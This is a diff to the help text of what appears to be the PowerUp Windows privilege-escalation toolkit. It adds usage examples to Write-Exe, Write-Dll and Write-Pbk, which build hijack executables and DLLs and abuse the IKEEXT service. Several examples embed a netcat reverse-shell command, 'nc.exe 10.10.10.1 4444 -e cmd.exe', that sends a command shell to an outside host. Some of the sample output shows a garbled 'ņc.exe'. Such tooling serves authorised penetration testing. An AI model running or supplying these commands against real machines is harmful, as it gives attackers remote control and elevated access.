@@ -2504,7 +2504,7 @@ as base64-encoded strings. The exe is then written out to the specified -Path.
 
 .PARAMETER Path
 
-File name to write the generated exe out to.
+File name to write the generated exe out to. Required.
 
 .PARAMETER Architecture
 
@@ -2517,7 +2517,23 @@ Path to the .bat for the exe to launch.
 
 .PARAMETER Command
 
-Custom command to execute instead of user creation.
+Custom command to execute instead of user creation. Required.
+
+.EXAMPLE
+
+Write-Exe -Path .\test.exe -Command "C:\Windows\Temp\nc.exe 10.10.10.1 4444 -e cmd.exe" -BatPath C:\Users\Public\debug.bat
+
+ExePath    Architecture BatLauncherPath           Command
+-------    ------------ ---------------           -------
+.\test.exe x64          C:\Users\Public\debug.bat C:\Windows\Temp\ņc.exe 10.10.10.1 4444 -e cmd.exe
+
+.EXAMPLE
+
+PS C:\Users\tommy> Write-Exe -Path .\test.exe -Command "C:\Windows\Temp\nc.exe 10.10.10.1 4444 -e cmd.exe" -Architecture x86
+
+ExePath    Architecture BatLauncherPath           Command
+-------    ------------ ---------------           -------
+.\test.exe x86          C:\Users\tommy\debug.bat C:\Windows\Temp\ņc.exe 10.10.10.1 4444 -e cmd.exe
 
 #>
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -2959,6 +2975,22 @@ Path to the .bat for the DLL to launch.
 
 Custom command to execute instead of user creation.
 
+.EXAMPLE
+
+Write-Dll -DllPath .\test.dll -Command "C:\Windows\Temp\nc.exe 10.10.10.1 4444 -e cmd.exe" -BatPath C:\Users\Public\sample.bat
+
+DllPath    Architecture BatLauncherPath            Command
+-------    ------------ ---------------            -------
+.\test.dll x64          C:\Users\Public\sample.bat C:\Windows\Temp\nc.exe 10.10.10.1 4444 -e cmd.exe
+
+.EXAMPLE
+
+PS C:\Users\tommy> Write-Dll -DllPath .\test.dll -Command "C:\Windows\Temp\nc.exe 10.10.10.1 4444 -e cmd.exe" -Architecture x86
+
+DllPath    Architecture BatLauncherPath           Command
+-------    ------------ ---------------           -------
+.\test.dll x86          C:\Users\tommy\debug.bat C:\Windows\Temp\nc.exe 10.10.10.1 4444 -e cmd.exe
+
 .OUTPUTS
 
 PowerUp.HijackableDLL
@@ -3051,7 +3083,15 @@ command, which starts the IKEEXT service.
 
 .PARAMETER Path
 
-Path to the desired .pbk file location.
+Path to the desired .pbk file location. Required.
+
+.EXAMPLE
+
+Write-Pbk -Path dummy.pbk
+
+PbkFile   TargetDll                        Usage
+-------   ---------                        -----
+dummy.pbk C:\Windows\System32\wlbsctrl.dll rasdial IKEEXT test test /PHONEBOOK:dummy.pbk
 
 #>
 
